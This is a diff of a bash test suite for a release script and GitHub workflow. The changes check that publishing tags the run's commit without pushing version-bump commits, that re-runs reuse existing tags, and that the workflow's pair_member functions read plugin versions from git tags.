+tag_run "$work/t2/a" 1.3.0 pkg-v1.3.0
+check "a tag another run pushed for another commit: refused, naming both" \
+  "$(is "$rc|$(contains "$out" "^::error::tag pkg-v1\.3\.0 already exists on $other, not $run, the commit this run releases$")" '1|true')"
+check "a tag another run pushed for another commit: the clone made no tag of its own" \
+  "$(is "$(git -C "$work/t2/a" tag -l)" "pkg-v1.2.0"$'\n'"pkg-v1.3.0")"
+check "tag pushes nothing: origin holds only the tags the other clone pushed" \
+  "$(is "$(git -C "$work/t2/origin.git" tag -l)" "pkg-v1.2.0"$'\n'"pkg-v1.3.0")"
 
 echo
 echo "Case: one publish job releases two packages from the run's commit"
 # release.yaml's publish job releases its packages one after another from one checkout, each from
-# the run's commit: `git checkout --force --detach "$GITHUB_SHA"` and `git clean -ffdx`, then "Set
-# release version", `tag`, `push-tag` and `push-main`, here each through the script under test
-# against a bare origin standing in for GitHub. The run's commit R holds a fix for each of two
-# packages, pkg and other: pkg's bump lands on R as it is, other's is rebased onto it, and each tag
-# stays on its own un-rebased bump commit, a child of R, where a re-run's version step finds it. A
-# re-run repeats every step and changes nothing on origin. The same re-run without the detach
-# between the packages is the control: pkg's push-main pushes nothing (main holds 1.0.1), so pkg's
-# re-made bump commit stays off main, other's `tag` commits on top of it, and other's push-main
-# refuses a HEAD two commits over main. Each re-run's bump is committed at a fixed earlier date, as
-# in case 7, so it is a commit of its own, as a re-run's is.
+# the run's commit: `git checkout --force --detach "$GITHUB_SHA"` and `git clean -ffdx`, then
+# `tag` and `push-tag`, here each through the script under test against a bare origin standing in
+# for GitHub. The run's commit R holds a fix for each of two packages, pkg and other: each tag
+# names R itself and no commit is made, so main's tip stays R, and a re-run finds each tag where
+# the first attempt left it, adds no commit of its own and changes nothing on origin.
 pj="$work/pj"
 setup "$pj"
 git -C "$pj/a" tag pkg-v1.0.0
@@ -1167,110 +669,126 @@ from_run() {
   git -C "$1" checkout -q --force --detach "$run"
   git -C "$1" clean -q -ffdx
 }
-# publish_package <clone> <package-dir> <name> <version> <tag>: one package's steps after its
-# hand-over check, from wherever <clone>'s HEAD is: "Set release version", `tag`, `push-tag` and
-# `push-main`, stopping at the first that fails. Leaves the failed step's name in failed (empty
-# when every step succeeded), the output of `tag` in tag_out, rc and out from the last step run,
-# and in pushed how many of its pushes reached origin.
+# publish_package <clone> <version> <tag>: one package's steps after its hand-over check, from the
+# run's commit: `tag`, then `push-tag`, stopping at the first that fails. Leaves the failed step's
+# name in failed (empty when every step succeeded), the output of `tag` in tag_out, rc and out
+# from the last step run, and in pushed how many of its pushes reached origin.
 publish_package() {
-  local clone=$1 package_dir=$2 name=$3 v=$4 tag=$5
+  local clone=$1 v=$2 tag=$3
   failed='' pushed=0
-  tag_run "$clone" "$v" "$tag" "$package_dir" "$name"
+  tag_run "$clone" "$v" "$tag" "$run"
   tag_out=$out
   [ "$rc" = 0 ] || { failed=tag; return 0; }
-  deploy_run "$clone" GITHUB_STEP_SUMMARY= -- push-tag "$tag"
+  deploy_run "$clone" -- push-tag "$tag"
   [ -z "$seen" ] || pushed=$((pushed + 1))
-  [ "$rc" = 0 ] || { failed=push-tag; return 0; }
-  deploy_run "$clone" GITHUB_STEP_SUMMARY= -- push-main "$package_dir" "$v"
-  [ -z "$seen" ] || pushed=$((pushed + 1))
-  [ "$rc" = 0 ] || failed=push-main
-}
-# only_version <repo> <commit> <package-dir> <version>: true when <commit>'s manifest is its
-# parent's with .version set to <version> and nothing else, as JSON, and its bun.lock is its
-# parent's with one line changed, the package's workspace entry's, to <version>.
-only_version() {
-  local repo=$1 commit=$2 dir=$3 v=$4
-  is "$(git -C "$repo" show "$commit^:$dir/package.json" | jq -S --arg v "$v" '.version = $v')|1	1	bun.lock|$v" \
-    "$(git -C "$repo" show "$commit:$dir/package.json" | jq -S .)|$(git -C "$repo" diff --numstat "$commit^" "$commit" -- bun.lock)|$(lock_version "$repo" "$commit" "$dir")"
+  [ "$rc" = 0 ] || failed=push-tag
 }
 # origin_refs: every ref origin holds, with the object it names.
 origin_refs() { git -C "$pj/origin.git" for-each-ref --format='%(refname) %(objectname)'; }
 o="$pj/origin.git"
-pkg_subject="chore: release pkg v1.0.1 [skip ci]"
-other_subject="chore: release other v2.0.1 [skip ci]"
 
 # The run: its build jobs read the version from the run's commit, then publish releases both.
 git clone -q "$o" "$pj/job"
-version_run "$pj/job" pkg-v --package-dir packages/pkg -- packages/pkg/
+version_run "$pj/job" pkg-v -- packages/pkg/
 check "the build of pkg: releases 1.0.1" "$(is "$rc $out" "0 $(outputs 1.0.1 pkg-v1.0.1 false)")"
-version_run "$pj/job" other-v --package-dir packages/other -- packages/other/
+version_run "$pj/job" other-v -- packages/other/
 check "the build of other: releases 2.0.1" "$(is "$rc $out" "0 $(outputs 2.0.1 other-v2.0.1 false)")"
 from_run "$pj/job"
-publish_package "$pj/job" packages/pkg pkg 1.0.1 pkg-v1.0.1
-check "first attempt, pkg: every step succeeds, its tag and its bump each pushed" "$(is "$failed|$pushed" "|2")"
+before=$(state "$pj/job")
+publish_package "$pj/job" 1.0.1 pkg-v1.0.1
+check "first attempt, pkg: every step succeeds, its tag pushed" "$(is "$failed|$pushed" "|1")"
 from_run "$pj/job"
-publish_package "$pj/job" packages/other other 2.0.1 other-v2.0.1
-check "first attempt, other: every step succeeds, its tag and its bump each pushed" "$(is "$failed|$pushed" "|2")"
-pkg_bump=$(git -C "$o" rev-parse -q --verify 'pkg-v1.0.1^{commit}' || true)
-other_bump=$(git -C "$o" rev-parse -q --verify 'other-v2.0.1^{commit}' || true)
-check "first attempt: main holds pkg's bump, then other's, over the run's commit" \
-  "$(is "$(git -C "$o" log --format=%s "$run..main")|$(git -C "$o" rev-parse main~2)" "$other_subject"$'\n'"$pkg_subject|$run")"
-check "first attempt: main's pkg bump changes only packages/pkg/package.json's .version and its bun.lock line" \
-  "$(is "$(git -C "$o" diff --name-only main~2 main~1)|$(only_version "$o" main~1 packages/pkg 1.0.1)" "bun.lock"$'\n'"packages/pkg/package.json|true")"
-check "first attempt: main's other bump, rebased onto pkg's, changes only packages/other/package.json's .version and its bun.lock line" \
-  "$(is "$(git -C "$o" diff --name-only main~1 main)|$(only_version "$o" main packages/other 2.0.1)" "bun.lock"$'\n'"packages/other/package.json|true")"
-check "first attempt: main's bun.lock holds both versions" \
-  "$(is "$(lock_version "$o" main packages/pkg) $(lock_version "$o" main packages/other)" "1.0.1 2.0.1")"
-check "first attempt: pkg's tag names its bump commit, a child of the run's commit, which main carries as it is" \
-  "$(is "$(git -C "$o" rev-parse "$pkg_bump^")|$pkg_bump" "$run|$(git -C "$o" rev-parse main~1)")"
-check "first attempt: other's tag names its un-rebased bump commit, a child of the run's commit, not main's rebased one" \
-  "$(is "$(git -C "$o" rev-parse "$other_bump^")|$([ "$other_bump" != "$(git -C "$o" rev-parse main)" ] && echo apart)" "$run|apart")"
-check "first attempt: other's tagged bump changes only packages/other/package.json's .version and its bun.lock line" \
-  "$(is "$(git -C "$o" diff --name-only "$run" "$other_bump")|$(only_version "$o" "$other_bump" packages/other 2.0.1)" "bun.lock"$'\n'"packages/other/package.json|true")"
+publish_package "$pj/job" 2.0.1 other-v2.0.1
+check "first attempt, other: every step succeeds, its tag pushed" "$(is "$failed|$pushed" "|1")"
+check "first attempt: each tag on origin names the run's commit" \
+  "$(is "$(git -C "$o" rev-list -n 1 pkg-v1.0.1) $(git -C "$o" rev-list -n 1 other-v2.0.1)" "$run $run")"
+check "first attempt: origin's main is still the run's commit" "$(is "$(git -C "$o" rev-parse main)" "$run")"
+check "first attempt: the clone added no commit, and left the manifests and the lockfile as they were" \
+  "$(is "$(state "$pj/job")" "$before")"
+check "first attempt: the pushes went through the deploy key" "$(is "$seen" "600 key"$'\n'"600 known_hosts")"
 refs=$(origin_refs)
 
 # A re-run: the same commit, with every tag the first attempt pushed.
 git clone -q "$o" "$pj/rerun"
 git -C "$pj/rerun" checkout -q --detach "$run"
 git -C "$pj/rerun" fetch -q --tags origin
-version_run "$pj/rerun" pkg-v --package-dir packages/pkg -- packages/pkg/
+version_run "$pj/rerun" pkg-v -- packages/pkg/
 check "re-run, the build of pkg: releases pkg-v1.0.1 again" \
   "$(is "$rc|$out|$(contains "$err" '^Releasing pkg-v1\.0\.1, already pushed for this checkout$')" "0|$(outputs 1.0.1 pkg-v1.0.1 false)|true")"
-version_run "$pj/rerun" other-v --package-dir packages/other -- packages/other/
+version_run "$pj/rerun" other-v -- packages/other/
 check "re-run, the build of other: releases other-v2.0.1 again" \
   "$(is "$rc|$out|$(contains "$err" '^Releasing other-v2\.0\.1, already pushed for this checkout$')" "0|$(outputs 2.0.1 other-v2.0.1 false)|true")"
 from_run "$pj/rerun"
-GIT_AUTHOR_DATE="2001-01-01T00:00:00Z" GIT_COMMITTER_DATE="2001-01-01T00:00:00Z" \
-  publish_package "$pj/rerun" packages/pkg pkg 1.0.1 pkg-v1.0.1
-check "re-run, pkg: every step succeeds, no push reaching origin" "$(is "$failed|$pushed" "|0")"
+before=$(state "$pj/rerun")
+publish_package "$pj/rerun" 1.0.1 pkg-v1.0.1
+check "re-run, pkg: every step succeeds" "$(is "$failed" "")"
 check "re-run, pkg: tag reuses its own tag" "$(contains "$tag_out" '^Tag pkg-v1\.0\.1 already exists for version 1\.0\.1; reusing it$')"
-check "re-run, pkg: push-main says main already holds the version" \
-  "$(contains "$out" "^::notice title=Version bump not pushed::main's packages/pkg/package\.json and bun\.lock already hold v1\.0\.1")"
 from_run "$pj/rerun"
-GIT_AUTHOR_DATE="2001-01-01T00:00:00Z" GIT_COMMITTER_DATE="2001-01-01T00:00:00Z" \
-  publish_package "$pj/rerun" packages/other other 2.0.1 other-v2.0.1
-check "re-run, other: every step succeeds, no push reaching origin" "$(is "$failed|$pushed" "|0")"
+publish_package "$pj/rerun" 2.0.1 other-v2.0.1
+check "re-run, other: every step succeeds" "$(is "$failed" "")"
 check "re-run, other: tag reuses its own tag" "$(contains "$tag_out" '^Tag other-v2\.0\.1 already exists for version 2\.0\.1; reusing it$')"
-check "re-run, other: push-main says main already holds the version" \
-  "$(contains "$out" "^::notice title=Version bump not pushed::main's packages/other/package\.json and bun\.lock already hold v2\.0\.1")"
+check "re-run: no commit is added to the clone" "$(is "$(state "$pj/rerun")" "$before")"
 check "re-run: origin's main and tags are unchanged" "$(is "$(origin_refs)" "$refs")"
 
-# The control: the same re-run from one clone, without the detach between the packages.
-git clone -q "$o" "$pj/control"
-git -C "$pj/control" checkout -q --detach "$run"
-git -C "$pj/control" fetch -q --tags origin
-from_run "$pj/control"
-GIT_AUTHOR_DATE="2001-01-01T00:00:00Z" GIT_COMMITTER_DATE="2001-01-01T00:00:00Z" \
-  publish_package "$pj/control" packages/pkg pkg 1.0.1 pkg-v1.0.1
-check "no detach between packages, pkg: every step succeeds, no push reaching origin" "$(is "$failed|$pushed" "|0")"
-GIT_AUTHOR_DATE="2001-01-01T00:00:00Z" GIT_COMMITTER_DATE="2001-01-01T00:00:00Z" \
-  publish_package "$pj/control" packages/other other 2.0.1 other-v2.0.1
-check "no detach between packages, other: tag commits its bump on top of pkg's, over the run's commit" \
-  "$(is "$(git -C "$pj/control" log --format=%s -2 HEAD)|$(git -C "$pj/control" rev-parse HEAD~2)" "$other_subject"$'\n'"$pkg_subject|$run")"
-check "no detach between packages, other: push-main refuses, no push reaching origin" "$(is "$failed|$pushed" "push-main|0")"
-check "no detach between packages, other: the error says HEAD carries 2 commits main does not" \
-  "$(contains "$out" '^::error::HEAD carries 2 commits main does not .* chore: release other v2\.0\.1 \[skip ci\]; [0-9a-f]* chore: release pkg v1\.0\.1 \[skip ci\]')"
-check "no detach between packages: origin's main and tags are unchanged" "$(is "$(origin_refs)" "$refs")"
+echo
+echo "Case: release.yaml's pair_member reads the plugin pair from the tags, not from the manifest"
+# A release commits nothing, so a package's committed manifest keeps whatever version was last
+# written to it and the tags alone say what npm carries. Both pair_member functions of
+# release.yaml — legion_build's "Resolve plugin versions for the smoke test and worker image" and
+# publish's "Check the plugin pair npm carries" — are read out of the workflow and run here over a
+# repository whose manifest holds an older version than its newest tag.
+workflow="$script_dir/../workflows/release.yaml"
+# pair_member_fn <step id>: the pair_member function that step defines, from its `pair_member() {`
+# line through the `}` that closes it, so the case runs the workflow's own code.
+pair_member_fn() {
+  awk -v id="        id: $1" '
+    $0 == id { step = 1 }
+    step && $0 == "          pair_member() {" { inside = 1 }
+    inside { print }
+    inside && $0 == "          }" { exit }
+  ' "$workflow"
+}
+check "the workflow defines a pair_member in each of the two steps" \
+  "$(is "$(pair_member_fn plugin_versions | grep -c 'pair_member() {')|$(pair_member_fn pair | grep -c 'pair_member() {')" '1|1')"
+pm="$work/pair"
+mkdir -p "$pm/packages/pi-envoy"
+git init -q -b main "$pm"
+identity "$pm"
+printf '{\n  "name": "@sjawhar/pi-envoy",\n  "version": "0.9.0"\n}\n' > "$pm/packages/pi-envoy/package.json"
+git -C "$pm" add -A
+git -C "$pm" commit -q -m "seed"
+git -C "$pm" tag pi-envoy-v1.9.0
+git -C "$pm" tag pi-envoy-v1.10.0
+# run_pair_member <step id> <arg>...: that step's pair_member, run from the repository.
+run_pair_member() {
+  local id=$1
+  shift
+  (cd "$pm" && eval "$(pair_member_fn "$id")" && pair_member "$@")
+}
+skipped=$(printf 'version=\ntag=\nskip=true')
+released=$(printf 'version=1.11.0\ntag=pi-envoy-v1.11.0\nskip=false')
+check "legion_build, the plugin skips: the newest tag's version, not the manifest's older one" \
+  "$(is "$(run_pair_member plugin_versions "$skipped" pi-envoy-v)" 1.10.0)"
+check "legion_build, the plugin releases: the version it releases" \
+  "$(is "$(run_pair_member plugin_versions "$released" pi-envoy-v)" 1.11.0)"
+check "publish, the plugin skips: the newest tag's version, not the manifest's older one" \
+  "$(is "$(run_pair_member pair success true success 1.11.0 pi-envoy-v)" 1.10.0)"
+check "publish, the plugin released: the version its release published" \
+  "$(is "$(run_pair_member pair success false success 1.11.0 pi-envoy-v)" 1.11.0)"
+check "publish, the release did not finish: nothing, which the step's guard refuses" \
+  "$(is "$(run_pair_member pair success false failure 1.11.0 pi-envoy-v)" "")"
+# A newest tag whose name is no release, and no tag at all: each prints nothing, and the step's
+# ::error::Could not resolve guard fires.
+git -C "$pm" tag -d pi-envoy-v1.10.0 >/dev/null
+git -C "$pm" tag -d pi-envoy-v1.9.0 >/dev/null
+git -C "$pm" tag pi-envoy-v1.9.0-rc.1
+check "legion_build, the newest tag is no release: prints nothing" \
+  "$(is "$(run_pair_member plugin_versions "$skipped" pi-envoy-v)" "")"
+check "publish, the newest tag is no release: prints nothing" \
+  "$(is "$(run_pair_member pair success true success 1.11.0 pi-envoy-v)" "")"
+git -C "$pm" tag -d pi-envoy-v1.9.0-rc.1 >/dev/null
+check "legion_build, no tag of the prefix at all: prints nothing" \
+  "$(is "$(run_pair_member plugin_versions "$skipped" pi-envoy-v)" "")"
 
 echo
 echo "Case 11: release creates a missing release, publishes a draft, and reuses a published one"
@@ -3007,5 +2525,5 @@ fold_refused "a version group's notes that are a dangling symlink" "rel_1\.11\.0
 check "push-fold refuses a version group's notes that are a dangling symlink: defers nothing" \
   "$(is "$(contains "$out" 'Fold deferred')" false)"
 
-summary "release-push.sh version, push-main, tagged, tag, release, push-tag, check-built, extract-built, push-built, handed, no-credential, fold-plan, fold-orphans and push-fold"
+summary "release-push.sh version, tagged, tag, release, push-tag, check-built, extract-built, push-built, handed, no-credential, fold-plan, fold-orphans and push-fold, and release.yaml's pair_member"
 
